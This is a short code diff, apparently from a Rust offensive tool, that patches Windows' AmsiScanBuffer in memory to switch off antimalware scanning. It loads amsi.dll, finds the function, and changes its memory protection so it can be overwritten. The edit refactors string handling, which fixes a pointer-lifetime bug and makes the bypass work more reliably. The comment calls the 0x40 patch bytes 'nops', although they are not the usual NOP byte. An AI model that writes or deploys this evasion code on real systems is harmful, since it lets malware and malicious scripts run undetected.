@@ -28,10 +28,12 @@ fn main() {
     unsafe {
         // Getting the address of AmsiScanBuffer.
         let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
-        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
-        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+        let amsi = CString::new("amsi").unwrap();
+        let amsi_dll = LoadLibraryA(amsi.as_ptr());
+        let amsi_scan_buffer = CString::new("AmsiScanBuffer").unwrap();
+        let amsi_scan_addr = GetProcAddress(amsi_dll, amsi_scan_buffer.as_ptr());
         let mut old_permissions: DWORD = 0;
-        
+
         // Overwrite this address with nops.
         if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
             panic!("[-] Failed to change protection.");
